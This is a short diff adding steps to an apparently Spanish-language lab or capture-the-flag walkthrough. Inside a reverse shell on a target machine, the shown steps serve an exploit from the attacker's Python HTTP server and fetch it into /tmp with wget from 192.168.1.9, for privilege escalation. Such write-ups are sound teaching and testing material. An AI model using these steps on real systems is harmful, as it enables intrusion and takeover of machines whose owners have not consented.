@@ -113,3 +113,17 @@ Descargar el exploit:
 searchsploit -m 15285
 ```
 ![14](https://user-images.githubusercontent.com/75953873/171931554-8fde81f6-88fd-4281-8597-ebeb5fd57124.png)
+
+Ejecutamos un servidor HTTP local simple con Python:
+```
+python3 -m http.server 80
+```
+![16](https://user-images.githubusercontent.com/75953873/171932402-4c30740c-4e87-4d2e-99be-b09d54c089c1.png)
+
+Dentro de la reverse shell generada, nos movemos al directorio `/tmp` y descargamos el exploit de nuestro servidor
+```
+cd /tmp
+wget http://192.168.1.9/15285.c
+```
+![15](https://user-images.githubusercontent.com/75953873/171932443-98620783-0a4f-4007-b69e-fe03b8ce7612.png)
+
